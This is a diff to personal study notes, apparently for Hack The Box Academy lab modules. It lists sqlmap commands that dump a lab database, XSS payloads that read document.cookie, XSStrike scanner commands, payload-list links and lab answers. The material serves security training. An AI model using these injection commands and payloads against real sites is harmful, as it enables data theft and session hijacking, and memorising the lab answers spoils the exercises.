@@ -227,3 +227,26 @@ sqlmap -u 'http://94.237.58.137:56113/case1.php?id=1' -D 'testdb' -T flag1 --bat
  sqlmap -u 'http://94.237.58.137:56113/case1.php?id=1' --search -C style --batch
  "What's the Kimberly user's password? (Case #1)"
  sqlmap -u 'http://94.237.58.137:56113/case1.php?id=1' --batch --dump
+----------------------------
+ <script>alert(document.cookie)</script>
+  To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.
+  <img src="" onerror=alert(document.cookie)>
+-------------------------
+ (like Nessus, Burp Pro, or ZAP)
+ kinlingit@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
+kinlingit@htb[/htb]$ cd XSStrike
+kinlingit@htb[/htb]$ pip install -r requirements.txt
+kinlingit@htb[/htb]$ python xsstrike.py
+python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
+https://github.com/payloadbox/xss-payload-list
+-------------------
+secure source
+https://academy.hackthebox.com/course/preview/secure-coding-101-javascript
+https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection
+-=-----------------
+"Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?"
+http://STMIP:STMPO/?fullname=test&username=test&password=123&email=test%40email.com:
+<script>alert(1)</script>
+"What type of XSS was found on the above server? "name only"
+Reflected
